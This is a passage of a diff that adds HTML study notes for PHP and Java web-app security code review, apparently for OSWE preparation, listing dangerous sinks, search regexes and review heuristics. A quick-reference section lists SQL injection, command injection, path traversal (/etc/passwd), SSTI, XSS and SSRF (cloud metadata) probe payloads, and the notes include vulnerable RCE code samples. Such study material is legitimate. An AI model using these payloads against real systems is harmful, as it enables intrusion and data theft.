+<li><code>$_FILES</code>, <code>move_uploaded_file</code>, <code>fopen</code>, <code>fwrite</code>, <code>file_put_contents</code>, <code>tmp_name</code>, <code>name</code>, <code>type</code>, <code>size</code></li>
+<li>extension allowlist / blacklist bypass</li>
+<li>path traversal via upload center and user-controlled filename</li>
+<li><code>../</code>, <code>%2e%2e</code>, <code>..%2f</code>, symlinked upload dirs</li>
+<li>web shell patterns: <code>.php</code>, <code>.phtml</code>, <code>.phar</code>, <code>.jsp</code>, <code>.js</code>, <code>.html</code>, <code>.aspx</code>, <code>.sh</code>, <code>.py</code></li>
+<li>search for: <code>$_FILES</code>, <code>move_uploaded_file</code>, <code>file_put_contents</code>, <code>tmp_name</code>, <code>upload</code>, <code>name</code>, <code>type</code></li>
+</ul>
+</section>
+<section>
+<h3>5.10. SQLi</h3>
+<ul>
+<li><code>mysqli_query</code>, <code>mysqli_multi_query</code>, <code>PDO::query</code>, <code>PDO::prepare</code>, <code>DB::select</code>, <code>wpdb-&gt;get_results</code>, raw SQL strings</li>
+<li><code>SELECT</code>, <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>UNION</code>, <code>--</code>, <code>OR 1=1</code>, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li>if user input reaches <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>OFFSET</code>, <code>HAVING</code>, inspect closely</li>
+<li>search for: <code>query(</code>, <code>prepare(</code>, <code>SELECT</code>, <code>ORDER BY</code>, <code>UNION</code>, <code>wpdb</code>, <code>PDO</code></li>
+</ul>
+</section>
+<section>
+<h3>5.11. Directory Traversal</h3>
+<ul>
+<li><code>file_get_contents</code>, <code>fopen</code>, <code>readfile</code>, <code>include</code>, <code>require</code>, <code>glob</code>, <code>opendir</code>, <code>is_file</code>, <code>unlink</code></li>
+<li><code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>file reads from uploads, templates, configs, logs, caches, temp files</li>
+<li><code>realpath</code>, <code>basename</code>, <code>dirname</code> are not enough unless paired with a proper root check</li>
+<li>zip slip: <code>ZipArchive</code>, <code>ZipArchive::extractTo</code>, <code>unzip</code> wrappers</li>
+<li>search for: <code>file_get_contents</code>, <code>readfile</code>, <code>fopen</code>, <code>include</code>, <code>require</code>, <code>glob</code>, <code>ZipArchive</code></li>
+</ul>
+</section>
+<section>
+<h3>5.12. Mass Assignment / Object Mutation</h3>
+<ul>
+<li><code>extract($_GET)</code>, <code>parse_str</code>, <code>$_REQUEST</code>, <code>array_merge($_GET, $_POST)</code>, <code>foreach ($request as $k =&gt; $v)</code></li>
+<li>session / config mutation: <code>$_SESSION</code>, <code>$_COOKIE</code>, <code>extract</code>, <code>array_walk</code>, <code>setcookie</code>, <code>register_globals</code> legacy patterns</li>
+<li>user-controlled keys mutating admin, roles, config, defaults, auth status</li>
+<li>search for: <code>extract</code>, <code>parse_str</code>, <code>$_REQUEST</code>, <code>$_SESSION</code>, <code>array_merge</code>, <code>foreach</code>, <code>setcookie</code></li>
+</ul>
+</section>
+<section>
+<h3>5.13. Auth / Session</h3>
+<ul>
+<li><code>$_SESSION</code>, <code>session_start</code>, <code>setcookie</code>, <code>session_regenerate_id</code>, <code>password_hash</code>, <code>password_verify</code>, <code>password_needs_rehash</code></li>
+<li><code>header(&#x27;Location: ...&#x27;)</code>, <code>Authorization</code>, <code>Bearer</code>, <code>X-API-Key</code>, <code>token</code>, <code>jwt</code>, <code>firebase/php-jwt</code></li>
+<li><code>is_admin</code>, <code>is_authenticated</code>, <code>role</code>, <code>admin</code>, <code>permissions</code></li>
+<li>search for: <code>session_start</code>, <code>$_SESSION</code>, <code>setcookie</code>, <code>Authorization</code>, <code>jwt</code>, <code>role</code>, <code>admin</code></li>
+</ul>
+</section>
+<section>
+<h3>5.14. SSRF</h3>
+<ul>
+<li><code>file_get_contents($url)</code>, <code>curl_exec</code>, <code>fsockopen</code>, <code>stream_context_create</code>, <code>HttpClient</code>, <code>Guzzle</code>, <code>wp_remote_get</code>, <code>Requests</code></li>
+<li><code>allow_redirects</code>, <code>verify</code>, <code>timeout</code>, <code>proxy</code>, <code>base_uri</code>, <code>url</code> built from user input</li>
+<li>internal IP / localhost checks: <code>127.0.0.1</code>, <code>localhost</code>, <code>10.0.0.0/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254.169.254</code></li>
+<li>search for: <code>curl</code>, <code>file_get_contents</code>, <code>HttpClient</code>, <code>Guzzle</code>, <code>wp_remote_get</code>, <code>localhost</code>, <code>url</code></li>
+</ul>
+</section>
+<section>
+<h3>5.15. XML / XXE</h3>
+<ul>
+<li><code>simplexml_load_string</code>, <code>simplexml_load_file</code>, <code>DOMDocument::loadXML</code>, <code>DOMDocument::loadHTML</code>, <code>XMLReader</code></li>
+<li><code>&lt;!DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+<li>search for: <code>simplexml_load</code>, <code>DOMDocument</code>, <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+</ul>
+</section>
+<section>
+<h3>5.16. Mass Assignment / Object Hydration</h3>
+<ul>
+<li><code>new User($_POST)</code>, <code>new Model($data)</code>, <code>array_map</code>, <code>extract</code>, <code>binding</code> of request arrays to objects</li>
+<li>user-controlled arrays turned into model objects, DTOs, config arrays</li>
+<li>search for: <code>new User</code>, <code>new Model</code>, <code>extract</code>, <code>$_POST</code>, <code>Request</code>, <code>bind</code>, <code>hydrate</code></li>
+</ul>
+</section>
+<section>
+<h3>5.17. Rabbit Holes</h3>
+<ul>
+<li><code>trim()</code>, <code>strtolower()</code>, <code>str_replace()</code>, <code>substr()</code>, <code>explode()</code>, <code>strpos()</code>, <code>preg_match()</code></li>
+<li><code>rand()</code>, <code>mt_rand()</code>, <code>uniqid()</code>, <code>password_hash()</code>, <code>hash()</code>, <code>md5()</code></li>
+<li><code>realpath()</code>, <code>basename()</code>, <code>dirname()</code>, <code>parse_url()</code></li>
+<li>these are usually not bugs by themselves; they matter only if they gate a real sink</li>
+<li>if it never reaches a sink, move on</li>
+</ul>
+</section>
+<section>
+<h3>5.18. KPI’s / High-Value Files</h3>
+<ul>
+<li><code>index.php</code>, <code>config.php</code>, <code>bootstrap.php</code>, <code>app.php</code>, <code>routes.php</code>, <code>settings.php</code>, <code>wp-config.php</code></li>
+<li><code>.env</code>, <code>env</code>, <code>$_ENV</code>, <code>getenv()</code>, <code>putenv()</code>, <code>ini_set</code>, <code>parse_ini_file</code>, <code>session.save_path</code></li>
+<li><code>PDO</code>, <code>mysqli</code>, <code>wpdb</code>, <code>Symfony</code> services, Laravel container, WordPress hooks</li>
+<li><code>eval</code>, <code>assert</code>, <code>exec</code>, <code>include</code>, <code>require</code>, <code>file_get_contents</code>, <code>curl</code>, <code>unserialize</code></li>
+<li>if config is imported and then used in a sink, it is usually high value</li>
+</ul>
+</section>
+<section>
+<h3>Quick Review Rule</h3>
+<ul>
+<li>Start with the sink: shell, eval, file write, template render, SQL, open, session/auth.</li>
+<li>Trace the user input backward.</li>
+<li>If the “fix” is only <code>trim()</code>, <code>strtolower()</code>, <code>str_replace()</code>, regex, or normalization, it is usually a rabbit hole unless it gates a real sink.</li>
+<li>Best OSWE clue: dynamic include + object injection + config + request arrays + runtime globals.</li>
+</ul>
+</section>
+<section>
+<h3>Useful Search Terms</h3>
+<ul>
+<li><code>eval\(|assert\(|preg_replace\(.*e|create_function|call_user_func|include\s*\$|require\s*\$</code></li>
+<li><code>exec\(|shell_exec\(|system\(|passthru\(|proc_open\(|popen\(</code></li>
+<li><code>unserialize\(|yaml_parse\(|simplexml_load_string|DOMDocument|loadXML</code></li>
+<li><code>\$\_GET|\$\_POST|\$\_REQUEST|\$\_COOKIE|\$\_SERVER|\$\_FILES</code></li>
+<li><code>mysqli_query|PDO::query|SELECT|ORDER BY|UNION|wpdb|query\(</code></li>
+<li><code>file_get_contents|fopen|readfile|include|require|glob|ZipArchive</code></li>
+<li><code>session_start|\$_SESSION|Authorization|jwt|role|admin</code></li>
+</ul>
+</section>
+<section>
+<h3>Payloads / Quick Reference</h3>
+<h4>RCE Checklist</h4>
+<ul>
+<li><code>eval</code>, <code>assert</code>, <code>preg_replace(&#x27;/.*/e&#x27;, ...)</code>, <code>create_function</code>, <code>call_user_func</code>, <code>include</code>, <code>require</code></li>
+<li><code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>, <code>proc_open</code>, <code>popen</code></li>
+<li>query, form, cookie, header, body values flowing into command strings or loaded files</li>
+<li>user-controlled <code>cmd</code>, <code>command</code>, <code>script</code>, <code>path</code>, <code>file</code>, <code>func</code>, <code>class</code>, <code>template</code></li>
+</ul>
+<h4>SQLi</h4>
+<ul>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>admin&#x27; --</code></li>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>ORDER BY 1--</code></li>
+</ul>
+<h4>Command Injection</h4>
+<ul>
+<li><code>; id;</code></li>
+<li><code>&amp;&amp; whoami</code></li>
+<li><code>| cat /etc/passwd</code></li>
+<li><code>$(id)</code></li>
+<li>`<code> </code>id<code> </code>`</li>
+<li><code>bash -c &#x27;id&#x27;</code></li>
+</ul>
+<h4>Traversal / File Reads</h4>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+<li><code>../secret.txt</code></li>
+</ul>
+<h4>Template Injection / SSTI</h4>
+<ul>
+<li><code>{{7*7}}</code></li>
+<li><code>{% for x in [1,2,3] %}{{ x }}{% endfor %}</code></li>
+<li><code>&lt;?= 7*7 ?&gt;</code></li>
+<li><code>${7*7}</code></li>
+</ul>
+<h4>XSS / HTML Injection</h4>
+<ul>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li><code>&quot;&gt;&lt;svg/onload=alert(1)&gt;</code></li>
+<li><code>javascript:alert(1)</code></li>
+</ul>
+<h4>Deserialization / Object Abuse</h4>
+<ul>
+<li><code>unserialize($_GET[&#x27;data&#x27;])</code></li>
+<li><code>yaml_parse($_POST[&#x27;data&#x27;])</code></li>
+<li><code>simplexml_load_string($_POST[&#x27;xml&#x27;])</code></li>
+<li><code>DOMDocument::loadXML($tainted)</code></li>
+</ul>
+<h4>SSRF</h4>
+<ul>
+<li><code>http://127.0.0.1:22</code></li>
+<li><code>http://localhost/admin</code></li>
+<li><code>http://169.254.169.254/latest/meta-data/</code></li>
+<li><code>file:///etc/passwd</code></li>
+</ul>
+</section>
+<section>
+<h3>Final rule</h3>
+<ul>
+<li>identify the framework first</li>
+<li>identify the template engine second</li>
+<li>then identify the real sink</li>
+<li>only after that do you chase input flows and payloads</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="java-subtopic-notes"><h2>6. Java Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>Java web-app review with Spring-first coverage plus Servlet, JSP, Struts, Thymeleaf, persistence, and serialization patterns</li>
+</ul>
+</section>
+<section>
+<h3>6.0. Identify the Stack</h3>
+<ul>
+<li>Spring Boot: <code>@SpringBootApplication</code>, <code>@RestController</code>, <code>@Controller</code>, <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@RequestMapping</code></li>
+<li>Spring MVC: <code>@Controller</code>, <code>@RequestParam</code>, <code>@PathVariable</code>, <code>@RequestBody</code>, <code>Model</code>, <code>HttpServletRequest</code></li>
+<li>Servlet/JSP: <code>HttpServlet</code>, <code>doGet</code>, <code>doPost</code>, <code>request.getParameter</code>, <code>response.getWriter</code>, <code>JSP EL</code>, <code>${...}</code></li>
+<li>Struts: <code>Action</code>, <code>ActionForm</code>, <code>struts.xml</code>, <code>OGNL</code></li>
+<li>Thymeleaf: <code>th:text</code>, <code>th:utext</code>, <code>@{...}</code>, <code>${...}</code></li>
+<li>JPA/Hibernate: <code>EntityManager</code>, <code>Query</code>, <code>CriteriaBuilder</code>, <code>session.createQuery</code></li>
+<li>MyBatis: <code>Mapper</code>, <code>@Select</code>, <code>#{param}</code></li>
+<li>Quarkus/Micronaut: <code>@Path</code>, <code>@GET</code>, <code>@POST</code>, <code>@Body</code></li>
+<li>JDBC/raw Java: <code>Statement</code>, <code>PreparedStatement</code>, <code>DriverManager</code>, <code>ProcessBuilder</code></li>
+</ul>
+</section>
+<section>
+<h3>6.1. Identify the Template Engine</h3>
+<ul>
+<li>JSP EL: <code>${...}</code>, <code>${param.foo}</code>, <code>${requestScope.x}</code></li>
+<li>Thymeleaf: <code>th:text</code>, <code>th:utext</code>, <code>${...}</code>, <code>@{...}</code></li>
+<li>Freemarker: <code>${...}</code>, <code>?html</code>, <code>TemplateHashModel</code></li>
+<li>Velocity: <code>$var</code>, <code>#set</code>, <code>#if</code>, <code>#include</code></li>
+<li>Mustache: <code>{{name}}</code>, <code>{{{html}}}</code></li>
+<li>OGNL: <code>${...}</code> in Struts/Apache Commons, object graph traversal</li>
+<li>if template engine is server-side and user input reaches it, inspect for SSTI</li>
+</ul>
+</section>
+<section>
+<h3>6.2. The 10 Patterns to Check First</h3>
+<ul>
+<li>Route precedence and generic-vs-specific confusion: <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@RequestMapping</code>, <code>@Controller</code>, <code>web.xml</code>, <code>doGet</code>, <code>doPost</code>, <code>@PathVariable</code></li>
+<li>Code execution / reflection abuse: <code>Runtime.getRuntime().exec</code>, <code>ProcessBuilder</code>, <code>ScriptEngine</code>, <code>ELProcessor</code>, <code>OGNL</code>, <code>Class.forName</code>, <code>newInstance</code></li>
+<li>Command injection: <code>ProcessBuilder</code>, <code>Runtime.exec</code>, <code>bash -c</code>, <code>cmd /c</code>, <code>powershell -Command</code></li>
+<li>Insecure deserialization: <code>ObjectInputStream</code>, <code>readObject</code>, <code>Serializable</code>, <code>yaml.load</code>, <code>Jackson</code> polymorphic deserialization</li>
+<li>Template injection / SSTI: <code>JSP EL</code>, <code>Thymeleaf</code>, <code>Freemarker</code>, <code>Velocity</code>, <code>Mustache</code></li>
+<li>XSS: <code>HttpServletResponse</code>, <code>PrintWriter</code>, <code>response.getWriter()</code>, <code>@ResponseBody</code>, JSP raw output</li>
+<li>File upload / write abuse: <code>MultipartFile</code>, <code>FileOutputStream</code>, <code>Files.write</code>, <code>transferTo</code>, <code>saveAs</code></li>
+<li>SQLi: <code>Statement</code>, <code>JdbcTemplate.query</code>, <code>EntityManager.createQuery</code>, <code>SELECT</code>, <code>ORDER BY</code>, <code>UNION</code></li>
+<li>Traversal / file read abuse: <code>FileInputStream</code>, <code>Files.readString</code>, <code>Paths.get</code>, <code>ResourceLoader</code>, <code>getResource</code>, <code>ZipFile</code></li>
+<li>Object mutation / property binding abuse: <code>setProperty</code>, <code>BeanUtils.copyProperties</code>, <code>Reflection</code>, <code>Class.forName</code>, <code>MBeanServer</code>, <code>@RequestBody</code></li>
+</ul>
+</section>
+<section>
+<h3>6.3. Routing</h3>
+<ul>
+<li>Spring: <code>@Controller</code>, <code>@RestController</code>, <code>@RequestMapping</code>, <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code></li>
+<li>Servlet: <code>doGet</code>, <code>doPost</code>, <code>service</code>, <code>web.xml</code>, <code>Filter</code>, <code>ServletContext</code></li>
+<li>Struts: <code>Action</code>, <code>ActionMapping</code>, <code>struts.xml</code>, <code>DispatchAction</code></li>
+<li>Safe rule: specific before generic; generic before specific = danger</li>
+<li>Check filter chain order: auth → validation → upload → business logic → render</li>
+<li>Search for: <code>@RequestMapping</code>, <code>doGet</code>, <code>doPost</code>, <code>*</code>, <code>/**</code>, <code>path</code>, <code>dispatch</code></li>
+</ul>
+</section>
+<section>
+<h3>6.4. Code Execution</h3>
+<ul>
+<li><code>Runtime.getRuntime().exec(...)</code>, <code>ProcessBuilder(...)</code>, <code>new ProcessBuilder(...)</code></li>
+<li><code>ScriptEngineManager</code>, <code>JavaScriptEngine</code>, <code>Nashorn</code>, <code>JRuby</code>, <code>GroovyShell</code>, <code>javax.script</code></li>
+<li><code>Class.forName(...)</code>, <code>getDeclaredMethod</code>, <code>invoke</code>, <code>MethodHandles.lookup</code>, <code>newInstance</code></li>
+<li><code>ELProcessor</code>, <code>ognl.Ognl</code>, <code>ExpressionFactory</code>, <code>JexlEngine</code></li>
+<li><code>Templates</code>, <code>Velocity</code>, <code>Freemarker</code>, <code>Thymeleaf</code> with untrusted input and evaluation context</li>
+<li>search for: <code>exec</code>, <code>ProcessBuilder</code>, <code>ScriptEngine</code>, <code>Class.forName</code>, <code>reflect</code>, <code>invoke</code>, <code>ELProcessor</code>, <code>ognl</code></li>
+</ul>
+<h4>4.1. Java RCE in practice</h4>
+<ul>
+<li><code>Runtime.getRuntime().exec(&quot;bash -c \&quot;&quot; + req.getParameter(&quot;cmd&quot;) + &quot;\&quot;&quot;)</code></li>
+<li><code>new ProcessBuilder(command).start()</code> with request-driven command array</li>
+<li><code>ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(userInput)</code></li>
+<li><code>new ELProcessor().eval(userInput)</code></li>
+<li><code>Class.forName(request.getParameter(&quot;className&quot;)).newInstance()</code></li>
+<li><code>ognl.OgnlRuntime.getMethod(...)</code> / OGNL expression abuse</li>
+<li><code>loadClass</code>, <code>invoke</code>, <code>MethodHandles</code> on attacker-controlled class names or method strings</li>
+</ul>
+<h4>4.2. High-value sinks / file names</h4>
+<ul>
+<li><code>CommandRunner.java</code>, <code>Shell.java</code>, <code>Exec.java</code>, <code>ProcessUtil.java</code>, <code>RuntimeUtil.java</code>, <code>BeanUtils.java</code></li>
+<li><code>cmd</code>, <code>command</code>, <code>exec</code>, <code>script</code>, <code>runtime</code>, <code>process</code>, <code>builder</code>, <code>clazz</code>, <code>method</code>, <code>template</code>, <code>expression</code></li>
+<li><code>ScriptEngine</code>, <code>ELProcessor</code>, <code>ProcessBuilder</code>, <code>Class.forName</code>, <code>Method.invoke</code></li>
+</ul>
+<h4>4.3. What to do when you find it</h4>
+<ul>
+<li>Confirm user input reaches <code>exec</code>, <code>ProcessBuilder</code>, <code>eval</code>, <code>reflect</code>, or <code>Class.forName</code></li>
+<li>Check whether the command is passed as a string or array built from request data</li>
+<li>Confirm the call is reachable from a controller, servlet, filter, or scheduled job</li>
+<li>Determine privileges and impact: file read, command execution, data theft, persistence</li>
+</ul>
+</section>
+<section>
+<h3>6.5. Command Injection</h3>
+<ul>
+<li><code>Runtime.getRuntime().exec(...)</code>, <code>ProcessBuilder.start()</code>, <code>ProcessBuilder.command()</code></li>
+<li><code>bash -c</code>, <code>sh -c</code>, <code>cmd /c</code>, <code>powershell -Command</code>, <code>python -c</code>, <code>curl ... | sh</code></li>
+<li>user input into <code>cmd</code>, <code>command</code>, <code>exec</code>, <code>script</code>, <code>args</code>, <code>shell</code>, <code>path</code>, <code>filename</code></li>
+<li><code>shell: true</code> equivalent is usually <code>bash -c</code> or a command string passed to <code>exec</code></li>
+<li>search for: <code>exec(</code>, <code>ProcessBuilder</code>, <code>bash -c</code>, <code>cmd /c</code>, <code>powershell</code></li>
+</ul>
+</section>
+<section>
+<h3>6.6. Insecure Deserialization</h3>
+<ul>
+<li><code>ObjectInputStream.readObject()</code>, <code>readUnshared()</code>, <code>XMLDecoder</code>, <code>JavaDeserializer</code></li>
+<li><code>Serializable</code>, <code>Externalizable</code>, <code>readResolve</code>, <code>readObject</code></li>
+<li><code>yaml.load</code>, <code>SnakeYAML</code>, <code>Jackson</code> with <code>enableDefaultTyping</code>, <code>@JsonTypeInfo</code>, polymorphic deserialization</li>
+<li>custom <code>deserialize</code>, <code>read</code>, <code>decode</code>, <code>load</code>, <code>hydrate</code> on user-controlled input</li>
+<li>search for: <code>readObject</code>, <code>deserialize</code>, <code>ObjectInputStream</code>, <code>Serializable</code>, <code>yaml</code>, <code>enableDefaultTyping</code>, <code>TypeResolver</code></li>
+</ul>
+</section>
+<section>
+<h3>6.7. Templates / SSTI</h3>
+<ul>
+<li>JSP EL: <code>${...}</code></li>
+<li>Thymeleaf: <code>${...}</code>, <code>th:utext</code>, <code>th:with</code></li>
+<li>Freemarker: <code>${...}</code></li>
+<li>Velocity: <code>$var</code>, <code>#set</code>, <code>#include</code></li>
+<li>Struts OGNL: <code>${...}</code>, <code>%{...}</code></li>
+<li>route → controller → template → user input</li>
+<li>payloads usually hit <code>${</code>, <code>$</code>, <code>#{</code>, <code>%{</code>, <code>{{</code> depending on engine</li>
+</ul>
+</section>
+<section>
+<h3>6.8. XSS</h3>
+<ul>
+<li>raw string return from controller/servlet; <code>response.getWriter().print(...)</code>; <code>@ResponseBody</code></li>
+<li>JSP/Thymeleaf rendering without escaping; <code>th:utext</code>, <code>unsafe</code> output, <code>response.setContentType(&quot;text/html&quot;)</code></li>
+<li><code>request.getParameter</code>, <code>@RequestParam</code>, <code>@PathVariable</code>, <code>@RequestHeader</code>, cookie values, headers, URL params</li>
+<li><code>OWASP Java Encoder</code>, <code>Jsoup.clean</code>, <code>StringEscapeUtils</code> if used, but not enough if sink is raw HTML</li>
+<li>search for: <code>getWriter</code>, <code>@ResponseBody</code>, <code>th:utext</code>, <code>out.print</code>, <code>PrintWriter</code>, <code>escape</code> vs <code>raw</code></li>
+</ul>
+</section>
+<section>
+<h3>6.9. File Upload</h3>
+<ul>
+<li><code>MultipartFile</code>, <code>CommonsMultipartResolver</code>, <code>StandardServletMultipartResolver</code></li>
+<li><code>transferTo</code>, <code>FileOutputStream</code>, <code>Files.write</code>, <code>Files.copy</code>, <code>OutputStream</code></li>
+<li><code>originalFilename</code>, <code>getOriginalFilename</code>, <code>getContentType</code>, <code>getBytes</code>, <code>destination</code></li>
+<li>extension allowlist / blacklist bypass</li>
+<li>traversal via upload dir + user filename: <code>../</code>, <code>%2e%2e</code>, <code>..%2f</code>, symlinked upload dirs</li>
+<li>web shell patterns: <code>.jsp</code>, <code>.jspx</code>, <code>.war</code>, <code>.html</code>, <code>.js</code>, <code>.php</code>, <code>.aspx</code>, <code>.sh</code>, <code>.py</code></li>
+<li>search for: <code>MultipartFile</code>, <code>transferTo</code>, <code>write</code>, <code>originalFilename</code>, <code>upload</code>, <code>dest</code>, <code>save</code></li>
+</ul>
+</section>
+<section>
+<h3>6.10. SQLi</h3>
+<ul>
+<li><code>Statement.executeQuery</code>, <code>Statement.execute</code>, <code>PreparedStatement</code> with string concatenation</li>
+<li>raw SQL in <code>JdbcTemplate.query</code>, <code>EntityManager.createNativeQuery</code>, <code>Query.createQuery</code>, <code>NamedParameterJdbcTemplate</code></li>
+<li><code>SELECT</code>, <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>UNION</code>, <code>--</code>, <code>OR 1=1</code>, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li>if user input reaches <code>WHERE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>HAVING</code>, inspect closely</li>
+<li>search for: <code>Statement</code>, <code>queryForObject</code>, <code>createQuery</code>, <code>createNativeQuery</code>, <code>ORDER BY</code>, <code>UNION</code>, <code>SELECT</code></li>
+</ul>
+</section>
+<section>
+<h3>6.11. Directory Traversal</h3>
+<ul>
+<li><code>Files.readString</code>, <code>Files.readAllBytes</code>, <code>FileInputStream</code>, <code>Paths.get</code>, <code>ResourceLoader</code>, <code>ClassPathResource</code></li>
+<li><code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>file reads from uploads, templates, logs, configs, caches, temp files</li>
+<li><code>Path.normalize</code>, <code>getCanonicalPath</code>, <code>startsWith</code> are not enough unless paired with a real allowlist / root check</li>
+<li>zip slip: <code>ZipFile</code>, <code>JarFile</code>, <code>zip</code>, <code>extract</code> / <code>Inflater</code> flows</li>
+<li>search for: <code>readString</code>, <code>readAllBytes</code>, <code>Paths.get</code>, <code>getResource</code>, <code>ZipFile</code>, <code>download</code>, <code>FileInputStream</code></li>
+</ul>
+</section>
+<section>
+<h3>6.12. Property Binding / Object Mutation</h3>
+<ul>
+<li><code>@RequestBody</code>, <code>ObjectMapper.readValue</code>, <code>BeanUtils.copyProperties</code>, <code>setProperty</code>, <code>PropertyDescriptor</code></li>
+<li><code>Map&lt;String, Object&gt;</code>, <code>HashMap</code>, <code>request.getParameterMap</code>, <code>RequestContext</code>, <code>BindUtils</code></li>
+<li><code>Class.forName</code>, <code>Reflection</code>, <code>MBeanServer</code>, <code>JMX</code>, <code>ObjectFactory</code>, <code>BeanWrapper</code></li>
+<li>user-controlled keys mutating admin, roles, config, defaults, security flags</li>
+<li>patching imported framework or library internals after load</li>
+<li>search for: <code>@RequestBody</code>, <code>BeanUtils</code>, <code>copyProperties</code>, <code>setProperty</code>, <code>Class.forName</code>, <code>Reflection</code>, <code>MBean</code></li>
+</ul>
+</section>
+<section>
+<h3>6.13. Auth / Session</h3>
+<ul>
+<li><code>HttpSession</code>, <code>Cookie</code>, <code>SecurityFilterChain</code>, <code>@PreAuthorize</code>, <code>@Secured</code>, <code>Authentication</code>, <code>Principal</code></li>
+<li><code>PasswordEncoder</code>, <code>BCryptPasswordEncoder</code>, <code>UserDetailsService</code>, <code>jwt</code>, <code>JJWT</code>, <code>Nimbus</code></li>
+<li><code>setSecure</code>, <code>setHttpOnly</code>, <code>setAttribute</code>, <code>SameSite</code>, <code>csrf</code>, <code>Authorization</code> headers</li>
+<li><code>ROLE_ADMIN</code>, <code>isAuthenticated()</code>, <code>hasAuthority</code>, <code>hasRole</code>, <code>authorizeHttpRequests</code></li>
+<li>search for: <code>session</code>, <code>cookie</code>, <code>jwt</code>, <code>Authorization</code>, <code>SecurityFilterChain</code>, <code>@PreAuthorize</code>, <code>hasRole</code></li>
+</ul>
+</section>
+<section>
+<h3>6.14. SSRF</h3>
+<ul>
+<li><code>HttpURLConnection</code>, <code>URL.openConnection</code>, <code>RestTemplate</code>, <code>WebClient</code>, <code>HttpClient</code>, <code>OkHttpClient</code></li>
+<li><code>allowRedirects</code>, <code>followRedirects</code>, <code>proxy</code>, <code>timeout</code>, <code>verify</code> / SSL options</li>
+<li><code>new URL(...)</code>, <code>URI.create(...)</code>, <code>baseUrl</code> + user input, <code>HttpRequest.newBuilder</code></li>
+<li>internal IP / localhost checks: <code>127.0.0.1</code>, <code>localhost</code>, <code>10.0.0.0/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254.169.254</code></li>
+<li>search for: <code>RestTemplate</code>, <code>WebClient</code>, <code>HttpClient</code>, <code>URL.openConnection</code>, <code>URI.create</code>, <code>localhost</code>, <code>internal</code></li>
+</ul>
+</section>
+<section>
+<h3>6.15. XML / XXE</h3>
+<ul>
+<li><code>DocumentBuilderFactory</code>, <code>SAXParserFactory</code>, <code>XMLInputFactory</code>, <code>TransformerFactory</code></li>
+<li><code>parse</code>, <code>newInputStream</code>, <code>DocumentBuilder</code>, <code>SAXParser</code></li>
+<li><code>&lt;!DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+<li>search for: <code>DocumentBuilderFactory</code>, <code>SAXParserFactory</code>, <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+</ul>
+</section>
+<section>
+<h3>6.16. Mass Assignment / Object Hydration</h3>
+<ul>
+<li><code>new User(...)</code>, <code>ObjectMapper.readValue(json, User.class)</code>, <code>BeanUtils.copyProperties(dest, src)</code></li>
+<li><code>Map&lt;String, Object&gt;</code>, <code>request.getParameterMap()</code>, <code>@RequestBody</code>, <code>JsonNode</code>, <code>ObjectNode</code></li>
+<li><code>setAccessible</code>, <code>reflect</code>, <code>getDeclaredFields</code>, <code>PropertyDescriptor</code>, <code>populate</code></li>
+<li>search for: <code>@RequestBody</code>, <code>ObjectMapper</code>, <code>readValue</code>, <code>copyProperties</code>, <code>populate</code>, <code>setAccessible</code></li>
+</ul>
+</section>
+<section>
+<h3>6.17. Rabbit Holes</h3>
+<ul>
+<li><code>trim()</code>, <code>toLowerCase()</code>, <code>replace()</code>, <code>substring()</code>, <code>split()</code>, <code>indexOf()</code>, <code>contains()</code></li>
+<li><code>Random</code>, <code>UUID.randomUUID()</code>, <code>MessageDigest.getInstance(&quot;SHA-256&quot;)</code>, <code>BCrypt</code>, <code>PBKDF2</code></li>
+<li><code>Pattern.matcher()</code>, <code>Matcher.find()</code>, <code>String.matches()</code></li>
+<li><code>Paths.get()</code>, <code>normalize()</code>, <code>toAbsolutePath()</code></li>
+<li>these are usually not bugs by themselves; they matter only if they gate a real sink</li>
+<li>if it never reaches a sink, move on</li>
+</ul>
+</section>
+<section>
+<h3>6.18. KPI’s / High-Value Files</h3>
+<ul>
+<li><code>Application.java</code>, <code>Main.java</code>, <code>SecurityConfig.java</code>, <code>WebSecurityConfig.java</code>, <code>Config.java</code>, <code>UserController.java</code></li>
+<li><code>application.properties</code>, <code>application.yml</code>, <code>server.xml</code>, <code>context.xml</code>, <code>persistence.xml</code></li>
+<li><code>Environment</code>, <code>@Value</code>, <code>@ConfigurationProperties</code>, <code>System.getenv</code>, <code>System.getProperties</code></li>
+<li><code>JdbcTemplate</code>, <code>EntityManager</code>, <code>ProcessBuilder</code>, <code>Runtime</code>, <code>Class.forName</code>, <code>ObjectMapper</code>, <code>SecurityFilterChain</code></li>
+<li>if config is imported and then used in a sink, it is usually high value</li>
+</ul>
+</section>
+<section>
+<h3>Quick Review Rule</h3>
+<ul>
